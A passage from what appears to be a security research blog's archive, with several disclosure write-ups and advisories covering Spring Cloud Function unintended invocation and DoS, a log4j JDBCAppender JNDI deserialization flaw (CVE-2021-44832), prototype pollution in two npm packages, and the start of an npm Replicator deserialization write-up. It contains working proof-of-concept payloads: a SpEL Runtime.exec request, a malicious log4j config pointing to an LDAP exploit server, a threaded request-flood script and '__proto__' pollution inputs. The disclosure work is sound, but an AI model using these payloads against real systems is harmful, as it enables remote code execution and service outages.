[normalizeFunctionDefinition](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L216) function –\n\n<img src=\"/img/blogs/spring-function-cloud/Image-6.png\" style=\"width: 100%;\"/>\n\nThis function will create a list named ‘eligibleFunction’ which contains the function a user can invoke. In case there is only one function defined, it will replace whatever name it got to that ‘default’ function name, otherwise, it will return the input as-is.\n\nHere, similar to the aforementioned DoS issue, the splitting of the function names is done after this function, so if the function name contains ‘,’ or ‘|’, the replacement to the ‘default’ function won’t happen.\n\nIn the following example, we add a cloud.fn dependency which is meant to add a function to our project (using the function-sample-pojo project as an example).\n\n<img src=\"/img/blogs/spring-function-cloud/Image-7.png\" style=\"width: 100%;\"/>\n\nWe have the following list:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-8.png\" style=\"width: 100%;\"/>\n\nDespite having an ‘eligibleFunction’ list, later in the lookup function, Spring Cloud Function will try to determine the function in the [‘this.discoverFunctionInBeanFactory(functionName);](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L124)’ line. The [discoverFunctionInBeanFactory](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L164) function searches in the whole beanFactory of the applicationContext, which is actually far more extensive than the list in eligibleFunctions and contains way more functions than intended and defined by developers via bean annotations, encompassing the entire bean library in ApplicationContext:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-9.png\" style=\"width: 100%;\"/>\n\nAlthough we have here over 580 other functions, other filters are being done later in the lookup function before registering.\n\n<img src=\"/img/blogs/spring-function-cloud/Image-10.png\" style=\"width: 100%;\"/>\n\nThe red highlights are the steps the functionCandidate needs to pass in order to register a function - but registering a function does not mean we can invoke them. These functions were not meant to execute from the function router like that; this results in unexpected behavior, where unintended functions attempt to execute but fail due to extraneous errors.  This is best shown in two common exceptions when attempting to invoke arbitrary functions from ApplicationContext:\n* Casting to a Supplier exception – happens to void functions, as these functions must have a return value\n* Argument mismatch – the input of the function is an object without a default/nullary constructor. Invocation fails without a simple constructor. (We can control to a certain extent the input type via different post payloads so sometimes this exception could be avoided)\n\nThe red highlighted code checks filter many beans from ApplicationContext **but not all**. For example, if the bean is a class, it must have one ‘functional’ function – a class pattern where the class has one function aside from the constructor. This means that while not all ApplicationContext beans are accessible, some beans are exposed, and some are not in a way that is completely tangential to whether they should have been exposed and invoked from URL function invocation.\n\nThe following code will dump **all** the functions a user can invoke in ApplicationContext, and when running this will show many more invokable functions than intended.\n\n```java\npublic static void main(String[] args) {\n\t\tCollection registeredBeans = new ArrayList<String>();\n\t\tCollection supplierRegisteredBeansExceptions = new ArrayList<String>();\n\t\tApplicationContext context = SpringApplication.run(DemoApplication.class, args);\n\t\tFunctionCatalog catalog = context.getBean(FunctionCatalog.class);\n\t\tSystem.out.println(\"Num of Beans: \" + context.getBeanDefinitionNames().length);\n\t\tfor (String functionName : context.getBeanDefinitionNames())\n\t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\tSimpleFunctionRegistry.FunctionInvocationWrapper function = (SimpleFunctionRegistry.FunctionInvocationWrapper)catalog.lookup(functionName);\n\t\t\t\tif (function != null)\n\t\t\t\t{\n\t\t\t\t\t//get non Supplier beans\n\t\t\t\t\tif (function.isSupplier())\n\t\t\t\t\t{\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t((Supplier)function.getTarget()).get();\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcatch (ClassCastException exception){supplierRegisteredBeansExceptions.add(functionName);}\n\t\t\t\t\t}\n\t\t\t\t\tregisteredBeans.add(functionName);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch (Exception e)\n\t\t\t{\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(\"Num of registered functions: \" + registeredBeans.size());\n\t\tSystem.out.println(registeredBeans);\n\t\tCollection nonSupplierRegisteredBeans = new HashSet<String>( registeredBeans );\n\t\tnonSupplierRegisteredBeans.removeAll(supplierRegisteredBeansExceptions);\n\t\tSystem.out.println(\"Non Supplier Functions: \" + nonSupplierRegisteredBeans);\n}\n```\nAs an example of an output, we can see some internal functions, configurations, and more:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-11.png\" style=\"width: 100%;\"/>\n\nThe applicationContext beans are dependent on user-code and dependencies imported into the project (just by adding dependencies to the pom.xml - more beans are added as per Spring’s core design, and thus more bean functions to potentially invoke). The impact of this can vary and is highly dependent on the application, its dependencies, and internal bean implementation, but the nature of this function invocation is entirely arbitrary.\n\nWhen we tried to find some interesting functions to invoke, we didn’t encounter anything with a real impact. But keep in mind that the search is endless and could change depending on the environment.\n\nHere is an example of an arbitrary function we can invoke that won’t cause any threat (org.springframework.boot.autoconfigure.context.LifecycleAutoConfiguration):\n\n<img src=\"/img/blogs/spring-function-cloud/Image-12.png\" style=\"width: 100%;\"/>\n<img src=\"/img/blogs/spring-function-cloud/Image-13.png\" style=\"width: 100%;\"/>\n\n(In order for the function to run it needs an input and depending on the type of parameter the post body needs to change. As you will see in the next example showing a Boolean parameter).\n\nA second example is when having the dependency org.apache.camel.springboot:camel-geocoder-starter-3.17.0 in the pom.xml. The class where we invoke the function is in the spring-cloud-commons package, but camel-geocoder-starter actually inserts this class into the application context. \n[createBuilder](https://github.com/spring-cloud/spring-cloud-commons/blob/v4.0.0-M2/spring-cloud-commons/src/main/java/org/springframework/cloud/commons/httpclient/DefaultOkHttpClientFactory.java#L47) in the DefaultOkHttpClientFactory class is the function, it changes ‘this.builder’ to disable SSL validation or enable it.\n\nThe screenshots below show that the builder changes are saved to ‘this’ object. Thus, we can change the builder to disable SSL validation for subsequent invocations. The severity of this specific invocation is questionable since the usage of this factory elsewhere in code is complicated, but this demonstrates a real example of an attacker changing a configuration by altering a global flag through a bound object that doesn’t seem to be the author’s intent.\n\n<img src=\"/img/blogs/spring-function-cloud/Image-14.png\" style=\"width: 100%;\"/>\n\n2nd invocation, the sslSockerFactoryOrNull is changed from the first call:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-15.png\" style=\"width: 100%;\"/>\n\n## Potential Impact Demonstration\n**The following code is written by us (Checkmarx Researchers.) It is completely fabricated and doesn’t exist in Spring. The purpose of this code is to demonstrate the potential impact of the issue, since the function itself is not inherently dangerous without user input, yet it is arbitrarily exposed via Spring Cloud Function.**\nHaving the following code and the dependency - org.springframework.amqp:spring-rabbit in the project. \n\n```java\nimport org.springframework.amqp.core.Message;\nimport org.springframework.amqp.rabbit.core.RabbitTemplate;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class RabbitTest {\n\n    public RabbitTest(){}\n\n    public Boolean checkMandatory(RabbitTemplate rabbitTemplate) {\n        return rabbitTemplate.isMandatoryFor(new Message(new byte[]{'a'}));\n    }\n}\n```\n\nIn this example, the @Component annotation adds the class to the application context. (Note that no @Bean annotation is required; components for dependency injection also end up in the application context). Since it’s a class, it must have one functional method according to the checks made in the lookup function (only one method apart from the constructor). Now we can call the checkMandatory function with the rabbitTest URI. \n\nThe object [RabbitTemplate](https://github.com/spring-projects/spring-amqp/blob/v3.0.0-M3/spring-rabbit/src/main/java/org/springframework/amqp/rabbit/core/RabbitTemplate.java) has a default/nullary constructor and a [setter](https://github.com/spring-projects/spring-amqp/blob/v3.0.0-M3/spring-rabbit/src/main/java/org/springframework/amqp/rabbit/core/RabbitTemplate.java#L529) that will take a string and parse a SpEL expression out of it. The isMandatoryFor function will execute getValue to that malicious expression, which, if you are familiar with SPeL vulnerabilities, results in expression execution, which, in SPeL’s case, is equivalent to a Java code Injection:\n\n```java\nPOST http://springhost/rabbitTest\n \n{\"mandatoryExpressionString\":\"T(java.lang.Runtime).getRuntime().exec(\\\"open -a /System/Applications/Calculator.app\\\")\"}\n```\n\n(Known issue - In case this doesn’t work and runs the default function, because of the [normalizeFunctionDefinition](https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L216) replacement, we can bypass this validation by calling  http://springhost/rabbitTest, (note the comma) . This will register the function to the cache and then we can call it again normally and execute it):\n\nThis execution will result in RCE:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-16.png\" style=\"width: 100%;\"/>\n\nAnother example with the dependency org.springframework.cloud:spring-cloud-starter-stream-rabbit, we get exposed to the function [spelConverter](https://github.com/spring-cloud/spring-cloud-stream/blob/v4.0.0-M2/core/spring-cloud-stream/src/main/java/org/springframework/cloud/stream/config/SpelExpressionConverterConfiguration.java#L89), which gets a string and returns an Expression. With the feature of passing one’s output to another’s input, having a class like so, this is also vulnerable:\n\n<img src=\"/img/blogs/spring-function-cloud/Image-17.png\" style=\"width: 100%;\"/>\n\nWe can’t directly call ‘get’ since the Expression object doesn’t have a default/nullary constructor, but it’s possible with the output of spelConverter. This hints at a much deeper issue where, using certain dependencies, a gadget of chained application context beans could be crafted.\n\nThe examples above have some custom code written, but here are some interesting functions we found only by adding dependencies to the pom.xml without a real impact. \n\n<img src=\"/img/blogs/spring-function-cloud/Image-18.jpg\" style=\"width: 100%;\"/>\n\n## Mitigation\nUpdate Spring Cloud Function to 3.2.6 or above, which contains basic filtering of some beans, use the configuration spring.cloud.function.ineligible-definitions to exclude additional unintended functions. \n\n# Timeline\n| Date    | Action |\n| -------- | ------- |\n| 2/06/2022 | Vulnerability was reported responsibly. |\n| 15/06/2022 | Checkmarx SCA customers using spring function cloud were warned and provided mitigation guidance,  without exposing the technical details of the findings. |\n| 15/06/2022 | Fixed version was released. |\n| 16/06/2022 | CVE-2022-22979 was assigned. |\n\n# Final Words\nDiscovering vulnerabilities like the ones documented in this report is why the Checkmarx Security Research Team performs investigations into open source projects. With open source making up the vast majority of today’s commercial software, security vulnerabilities must be taken seriously and handled carefully across the industry.\n\nSolutions like [Checkmarx SCA](https://checkmarx.com/product/cxsca-open-source-scanning/?) are essential in helping organizations identify, prioritize, and remediate open source vulnerabilities more efficiently to improve their overall software security risk posture. Checkmarx SCA customers receive notice of issues like the ones described above in advance of public disclosure. For more information or to speak to an expert about how to detect, prioritize, and remediate open source risks in your code, contact us.\n\n# References\n* https://advisory.checkmarx.net/advisory/CX-2022-5010/\n* https://advisory.checkmarx.net/advisory/CX-2022-5009/\n* https://tanzu.vmware.com/security/cve-2022-22979\n* [DoS Fix](https://github.com/spring-cloud/spring-cloud-function/commit/9b6952f041ed028aba1165a55f38589ec6a93c09)\n* [Unintended function invocation mitigation](https://github.com/spring-cloud/spring-cloud-function/commit/1381cd4e6d04961d028683d2226242c01d7397ab)","tags":["java","dos","denial of service","code execution"]},{"title":"Deserialization attack via JDBC Appender in log4j","url":"/2021/12/29/Deserialization attack via JDBC Appender in log4j/","content":"## Summary\nApache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to a Arbitrary Code Execution attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.\n\n## Product\nApache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4).\n\n## Impact\nIn case an attacker can modify the logging configuration (due to fetching remote configuration feature in log4j this opens different attack vectors, such as MITM, DNS poisoning, lateral movement after gaining access to a storage node) an Arbitrary Code Execution could be achieved.\n\n## Steps to reproduce\nUsing the same LDAP server as done in the CVE-2021-44228 PoC, all we need to do is to run: \n \n```java\nSystem.setProperty(\"log4j2.configurationFile\",\"http://127.0.0.1:8888/config.xml\"); \nSystem.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); \nfinal Logger logger = LogManager.getLogger(log4j.class); \n```\n\nAnd to serve the following config.xml: \n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?> \n<Configuration status=\"error\"> \n    <Appenders> \n        <JDBC name=\"databaseAppender\" tableName=\"dbo.application_log\"> \n            <DataSource jndiName=\"ldap://127.0.0.1:1389/Exploit\" /> \n            <Column name=\"eventDate\" isEventTimestamp=\"true\" /> \n            <Column name=\"level\" pattern=\"%level\" /> \n            <Column name=\"logger\" pattern=\"%logger\" /> \n            <Column name=\"message\" pattern=\"%message\" /> \n            <Column name=\"exception\" pattern=\"%ex{full}\" /> \n        </JDBC> \n    </Appenders> \n    <Loggers> \n        <Root level=\"warn\"> \n            <AppenderRef ref=\"databaseAppender\"/> \n        </Root> \n    </Loggers> \n</Configuration> \n```\n\n### Expected result:\nWhen initializing the logger object, a request to the config.xml will be made. In the loading process, an attempt to load the DataSource will make a request to the LDAP server that will then redirect to a malicious class. In the end, the arbitrary class will be deserialized and run. \n\n## Remediation\nUpdate log4j to one of the fixed versions.\n\n## Credit\nThis issue was discovered and reported by Checkmarx Security Researchers [Yaniv Nizry](https://twitter.com/ynizry) and [Liad Levy](https://twitter.com/liad__levy).\n\n## Resources\n1. [Release Candidate](https://lists.apache.org/thread/kflcpnczh2y0vhfxn5fd0fnxb80l5kwm) \n2. [Commit](https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16)\n3. [Blog Post](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)\n","tags":["deserialization","java","log4j","log4j2"]},{"title":"CVE-2021-44832: Apache Log4j 2.17.0 Arbitrary Code Execution via JDBCAppender DataSource Element","url":"/2021/12/27/Apache Log4j 2.17.0 Arbitrary Code Execution via JDBCAppender DataSource Element/","content":"# Introduction\nLog4j is a highly popular logging package in Java that is used widely by developers, companies such as Google, Steam, Apple, Minecraft, and even on one of NASA’s Mars rovers utilize this package. On December 9th, the most critical zero-day exploit in recent years was discovered in log4j. The vulnerability [CVE-2021-44228](https://checkmarx.com/blog/apache-log4j-remote-code-execution-cve-2021-44228/?) was unauthenticated, zero-click RCE (Remote Code Execution) by logging a certain payload.\n\nFollowing that, a big hype was created in the world and especially in the security community, making many researchers interested in logging packages. Several other vulnerabilities and bypasses were found and published since then in log4j and other logging packages, find out more on our [“Variants and Updates”](https://checkmarx.com/resources/homepage/apache-log4j-rce-variants-and-updates?) blog.\n\n\n# Technical Details\nBeing extremely focused and dedicated researchers, we wanted to do a security audit ourselves on the log4j package in the hope of finding something interesting. And after a week of reviewing the code and testing, we encountered a new undiscovered deserialization security vulnerability. This vulnerability doesn’t use the disabled lookup feature.\n\nThe complexity of this vulnerability is higher than the original CVE-2021-44228 since it requires the attacker to have control over the configuration (like the ‘logback’ vulnerability [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550)). **In log4j there is a feature to load a remote configuration file** that isn't part of the local codebase and opens various attack vectors such as [MITM](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) (man in the middle) attack, DNS poisoning, lateral movement after gaining access to a storage node.\n\nWhile looking at log4j features we came across the [‘Appender’](https://logging.apache.org/log4j/2.x/manual/appenders.html) functionalities. Appenders are basically where to output the logs, so we have for example ConsoleAppender, FileAppender, etc.\n\nThe [JDBCAppender](https://logging.apache.org/log4j/2.x/manual/appenders.html#JDBCAppender) caught our eyes since there are some public ways of getting RCE via JDBC Java deserialization (see this [Blackhat](https://www.youtube.com/watch?v=Lv9BC_bYaI8) talk By Yongtao Wang, Lucas Zhang and Kunzhe Chai for more information).\n\nBut before getting into the JDBC deserialization in log4j, we noticed that in the documentation there is a way to configure log4j so that it will fetch the database source dynamically and remotely via JNDI. The configuration of the remote database location is done with the DataSource element. Taking the example from the official documentation:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Configuration status=\"error\">\n\t<Appenders>\n\t<JDBC name=\"databaseAppender\" tableName=\"dbo.application_log\">\n\t\t     <DataSource jndiName=\"java:/comp/env/jdbc/LoggingDataSource\" />\n\t\t <Column ...\n\t</JDBC>\n </Appenders>\n…\n</Configuration>\n```\nthere was not any restriction of putting an arbitrary LDAP remote URL, thus making it potential to the classic JNDI:LDAP deserialization vector (more information on the [Blackhat](https://www.youtube.com/watch?v=Y8a5nB-vy78) talk by Alvaro Munoz & Oleksandr Mirosh).\nAfter changing the tag to:\n```xml\n<DataSource jndiName=\"ldap://127.0.0.1:1389/Exploit\"/>\n```\nour payload was triggered, and we executed calc.exe on the machine.\n<img src=\"/img/blogs/log4j2/Image-1.png\" style=\"width: 100%;\"/>\n<video controls=\"\" src=\"/videos/log4j2/Video-1.mov\" style=\"width: 100%;\"></video>\n\n`DataSource dataSource = (DataSource)context.lookup(jndiName);`\n\nIs the line that triggers the JNDI lookup, it is in `DataSourceConnectionSource -> createConnectionSource` which is called from the `PluginBuilder`. And this is also the reason for the crash since we cannot cast the object to DataSource (the crash happens after the deserialization). The lookup function will do LDAP lookup to the “RemainingName” which is the DN (what comes after the slash).\n\nTo understand the calls better, we can follow the callgraph bottom up to see who calls who:\n```\ncreateConnectionSource:75, DataSourceConnectionSource (org.apache.logging.log4j.core.appender.db.jdbc)\ninvoke0:-1, NativeMethodAccessorImpl (sun.reflect)\ninvoke:62, NativeMethodAccessorImpl (sun.reflect)\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\ninvoke:498, Method (java.lang.reflect)\nbuild:136, PluginBuilder (org.apache.logging.log4j.core.config.plugins.util)\ncreatePluginObject:1120, AbstractConfiguration (org.apache.logging.log4j.core.config)\ncreateConfiguration:1045, AbstractConfiguration (org.apache.logging.log4j.core.config)\ncreateConfiguration:1037, AbstractConfiguration (org.apache.logging.log4j.core.config)\ncreateConfiguration:1037, AbstractConfiguration (org.apache.logging.log4j.core.config)\ndoConfigure:651, AbstractConfiguration (org.apache.logging.log4j.core.config)\ninitialize:247, AbstractConfiguration (org.apache.logging.log4j.core.config)\nstart:293, AbstractConfiguration (org.apache.logging.log4j.core.config)\nsetConfiguration:626, LoggerContext (org.apache.logging.log4j.core)\nreconfigure:699, LoggerContext (org.apache.logging.log4j.core)\nreconfigure:716, LoggerContext (org.apache.logging.log4j.core)\nstart:270, LoggerContext (org.apache.logging.log4j.core)\ngetContext:155, Log4jContextFactory (org.apache.logging.log4j.core.impl)\ngetContext:47, Log4jContextFactory (org.apache.logging.log4j.core.impl)\ngetContext:196, LogManager (org.apache.logging.log4j)\ngetLogger:599, LogManager (org.apache.logging.log4j)\nmain:11, log4j\n```\n\n# Steps To Reproduce\nFor the vulnerability to be exploitable, Log4J’s configuration file needs to be loaded from an external source. This can be a remote FTP server, cloud storage etc. An attacker could use technics such as DNS poisoning and MITM in order to inject a uniquely crafted configuration file and ultimately exploit the vulnerability.\n\n1. Fetching Remote configuration via HTTP\n```java\nSystem.setProperty(\"log4j2.configurationFile\",\"http://127.0.0.1:8888/log4j2.xml\");\n```\n2. Using the same LDAP (Lightweight Directory Access Protocol) server as done in the CVE-2021-44228 PoC (Proof of Concept), all we need to do is to run:\n```java\n//log4j.java\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\npublic class log4j {\n    static {\n        System.setProperty(\"log4j2.configurationFile\",\"http://127.0.0.1:8888/log4j2.xml\");\n        System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");\n    }\n    private static final Logger logger = LogManager.getLogger(log4j.class);\n\n    public static void main(String[] args) {\n    }\n}\n```\n3. Inject the malicious log4j2.xml file into the response:\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Configuration status=\"error\">\n    <Appenders>\n        <JDBC name=\"databaseAppender\" tableName=\"dbo.application_log\">\n            <DataSource jndiName=\"ldap://127.0.0.1:1389/Exploit\" />\n            <Column name=\"eventDate\" isEventTimestamp=\"true\" />\n            <Column name=\"level\" pattern=\"%level\" />\n            <Column name=\"logger\" pattern=\"%logger\" />\n            <Column name=\"message\" pattern=\"%message\" />\n            <Column name=\"exception\" pattern=\"%ex{full}\" />\n        </JDBC>\n    </Appenders>\n    <Loggers>\n        <Root level=\"warn\">\n            <AppenderRef ref=\"databaseAppender\"/>\n        </Root>\n    </Loggers>\n</Configuration>\n```\n\n# Expected Results\nWhen initializing the logger object, a request to the remote log4j2.xml will be made. In the loading process, an attempt to load the DataSource object will make a request to the LDAP server that will then redirect to a malicious class. In the end, the arbitrary class will be deserialized and executed.\n\n# Apache’s Fix\nOn December 27th the fixing commit [05db5f9](https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16) was released. As we can see before the fix, the lookup of the DataSource was made directly with the InitialContext, which is a Java internal class.\n\n<img src=\"/img/blogs/log4j2/Image-2.jpg\" style=\"width: 100%;\"/>\n\nIn version 2.17.1 the lookup uses the log4j’s JNDI wrapper, and thus disables the lookup. A new log4j2.enableJndiJdbc system property was added to reenable this functionality.\n\nThis is the reason why the vulnerability is exploitable using log4j’s default system properties.\n\n# Why Is This Interesting?\nThere are two main configuration scenarios when using Log4J.\n\n* The configuration is on a remote location. This can be useful for developers in case of multiple products sharing the same logging configuration. In this case, an attacker could expand their control over a network by gaining access to the node that serves the configuration file, or use techniques such as MITM and DNS poisoning to inject a malicious configuration file and trigger code execution.\n* The configuration is a local file and is part of the repository or project. This is the case for most products in the wild. Even though this scenario is harder to leverage, an attacker could attempt to alter the configuration file by gaining access to the source code, especially if it’s an open-source project that’s maintained by a community such as GitHub. For example, an attacker could find a popular Java package that’s using Log4J, alter its configuration file, and cause a supply chain attack for developers who are using this package. **Unlike changes to the code itself, configuration files tend to draw less focus and are easier to “sweep under the rug”.**\n\n# Mitigation\nUpgrade your Apache Log4j2 to versions 2.17.1, 2.12.4, and 2.3.2 or above.\n\n# Timeline of Disclosure\n| Date    | Action |\n| -------- | ------- |\n| 27/12/2021 | Responsible disclosure was made to Apache. |\n| 27/12/2021 | Acknowledgment received from Apache. |\n| 28/12/2021 | Checkmarx customers who were using Log4J were warned, without exposing the vulnerability‘s details. |\n| 28/12/2021 | CVE-2021-44832 was assigned to this issue. |\n| 28/12/2021 | Fixed version 2.17.1 was released. |","tags":["deserialization","java","log4j","log4j2"]},{"title":"Prototype pollution in cloneextend","url":"/2021/06/27/Prototype pollution in cloneextend/","content":"## Summary\nAffected versions of cloneextend (npm) are vulnerable to prototype pollution via the clone and extend functions.\n\n## Product\nAll versions of cloneextend npm package.\n\n## Impact\nIf untrusted data reaches one of the affected functions, prototype pollution can be achieved. The impact will depend on the application.\n\n## Steps to reproduce\n```js\nvar ce = require('cloneextend');\nce.extend({},JSON.parse('{\"__proto__\":{\"polluted\":1}}'))\nconsole.log({}.polluted)\n>1\n \nce.clone(JSON.parse('{\"__proto__\":{\"a\":1}}'))\nconsole.log({}.a)\n>1\n```\n\n### Expected result:\n1 will be printed to the console.\n\n## Remediation\nCurrently no fix has been released. As a workaround, avoid passing untrusted inputs to the vulnerable functions.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [NPM Package](https://www.npmjs.com/package/cloneextend)\n","tags":["npm","prototype-pollution"]},{"title":"Prototype pollution in extend2","url":"/2021/06/27/Prototype pollution in extend2/","content":"## Summary\nAffected versions of extend2 (npm) are vulnerable to prototype pollution via the extend function.\n\n## Product\nAll versions of extend2 (npm).\n\n## Impact\nIf untrusted data reaches one of the affected functions, prototype pollution can be achieved. The impact will depend on the application.\n\n## Steps to reproduce\n```js\nconst extend = require('extend2');\na = {'a':1};\nextend(true, {}, a, JSON.parse('{\"__proto__\":{\"polluted\":1}}'));\nconsole.log({}.polluted);\n```\n\n### Expected result:\n1 will be printed to the console.\n\n## Remediation\nCurrently no fix has been released. As a workaround, avoid passing untrusted inputs to the vulnerable function.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [NPM Package](https://www.npmjs.com/package/extend2)\n","tags":["npm","prototype-pollution"]},{"title":"DoS in Spring Cloud Function","url":"/2021/06/16/DoS in Spring Cloud Function/","content":"## Summary\nIn Spring Cloud Function versions 3.2.5 and older unsupported versions, it is possible for a user who directly interacts with framework provided lookup functionality to cause denial of service condition due to the caching issue in Function Catalog component of the framework. At the time of writing of this CVE such interaction is only possible via spring-cloud-function-web module.\n\n## Product\nSpring Cloud Function versions before 3.2.6.\n\n## Impact\nIn case the web endpoint for function invocation is open a DoS could be achieved.\n\n## Steps to reproduce\n```\nimport threading\ndef a():\n\tfor i in range(100000):\n\t\tresponse =requests.post(f\"http://host/uppercase,\", json={'a':1})\n\t\tif i%100 == 0:\n\t\t\tprint(response.elapsed.total_seconds()) \n\nfor i in range(10):\n\tthreading.Thread(target=a).start()\n\tif i ==9:\n\t\ta()\n\n```\n* replace the name of the function (`uppercase`) with a function that exists\n\n### Expected result:\nThe time for a response will rise and eventually crash the server.\n\n## Remediation\nUpdate Spring Cloud Function to 3.2.6 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Official advisory](https://tanzu.vmware.com/security/cve-2022-22979)\n2. [Commit](https://github.com/spring-cloud/spring-cloud-function/commit/9b6952f041ed028aba1165a55f38589ec6a93c09)","tags":["java","dos","denial of service"]},{"title":"Unintended function invocation in Spring Cloud Function","url":"/2021/06/16/Unintended function invocation in Spring Cloud Function/","content":"## Summary\nIn Spring Cloud Function it's possible for users to invoke unintended functions that follow some arbitrary rules. In versions 3.2.6 and above a `spring.cloud.function.ineligible-definitions` configuration was introduced to mitigate the issue but it still requires the user to go over the unintended functions a user might run.\n\n## Product\nSpring Cloud Function versions before 3.2.6.\n\n## Impact\nThe impact is highly dependent on the application context, and on the worse case could lead to RCE. \n\n## Steps to reproduce\n1. Run the  following main function: \n```\npublic static void main(String[] args) {\n\t\tCollection registeredBeans = new ArrayList<String>();\n\t\tApplicationContext context = SpringApplication.run(DemoApplication.class, args);\n\t\tFunctionCatalog catalog = context.getBean(FunctionCatalog.class);\n\t\tSystem.out.println(\"Num of Beans: \" + context.getBeanDefinitionNames().length);\n\t\tfor (String functionName : context.getBeanDefinitionNames())\n\t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\tSimpleFunctionRegistry.FunctionInvocationWrapper function = (SimpleFunctionRegistry.FunctionInvocationWrapper)catalog.lookup(functionName);\n\t\t\t\tif (function != null)\n\t\t\t\t{\n\t\t\t\t\tregisteredBeans.add(functionName);\n\t\t\t\t}\n\t\t\t}\n\t\t\tcatch (Exception e)\n\t\t\t{\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(\"Num of registered functions: \" + registeredBeans.size());\n\t\tSystem.out.println(registeredBeans);\n}\n\n```\n2. The output will list all of the functions a user can call, there will be more than the application's intention.\n\n### Expected result:\nUnintended functions could be executed, the impact could vary.\n\n## Remediation\nUpdate Spring Cloud Function to 3.2.6 or above, and use the configuration spring.cloud.function.ineligible-definitions to exclude unintended functions.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Commit](https://github.com/spring-cloud/spring-cloud-function/commit/1381cd4e6d04961d028683d2226242c01d7397ab)","tags":["java","function"]},{"title":"CVE-2021-33420: NPM Replicator Remote Code Execution Deserialization","url":"/2021/06/13/NPM Replicator Remote Code Execution Deserialization/","content":"# Introduction\nNPM, the package manager for Node.js, is an open source project that serves as a critical part of the JavaScript community and helps support one of the largest developer ecosystems. According to its [website](https://www.npmjs.com/), \"npm is relied upon by more than 11 million developers worldwide. The free npm registry has become the center of JavaScript code sharing, and with more than one million packages, is the largest software registry in the world.\"\n\nGiven the breadth of the npm universe and the Checkmarx Security Research Team’s always-on curiosity into performing investigations into open source projects and uncovering 0-days, we recently conducted an npm-focused vulnerability workshop. As a result of our efforts, we discovered an interesting remote code execution (RCE) deserialization issue in the npm [Replicator](https://www.npmjs.com/package/replicator) package.\n# Impact Summary\nDeserialization of any untrusted input in the npm Replicator package, which sees more than 200,000 downloads per week, could lead to remote code execution and full compromise of the machine.\n\n# Overview\nReplicator is an \"advanced JavaScript objects serialization\" package in npm. This package wraps around the JSON parse and stringify functions, and provides additional functionalities to it. On top of the JSON key-value pairs, Replicator adds support for the following 9 objects:\n\n* undefined\n* NaN\n* Date\n* RegExp\n* Error\n* Map\n* Set\n* ArrayBuffer\n* Typed arrays\n\n# Details\nFirst, let's get a general idea of how Replicator serializes and deserializes those unsupported JSON objects. When trying to serialize a ***Set*** object for example, the following output will be generated:\n\n<img src=\"/img/blogs/replicator/Image-1.png\" style=\"width: 100%;\"/>\n\nThe object ***Set*** was changed to a valid JSON with the key \"@t\" pointing to the type of the object inside the double brackets \"[[***type***]]\", and the parameters passed to the object are under the \"data\" property.\n\nWhen researching these types of packages, it’s interesting to focus on the deserialization component since it is more likely that a user input would be string passed to the deserialization code rather than an object passing to the serialization code.\n\nAfter checking how the deserialization is implemented in the code, the first 8 types seemed safe. However, with further examination, we came across an issue at the last object type – ***TypeArray***.\n\n<img src=\"/img/blogs/replicator/Image-2.png\" style=\"width: 100%;\"/>\n\nThe function on the bottom is the one responsible for the deserialization. With that, let’s serialize one of the TypeArrays – ***Int8Array***:\n\n<img src=\"/img/blogs/replicator/Image-3.png\" style=\"width: 100%;\"/>\n\nThe property \"ctorName\" states the object name of the ***TypeArray*** and the \"arr\" is the object value. But the issue in the code is that there is no validation that the object name in \"ctorName\" is actually a ***TypeArray*** object. 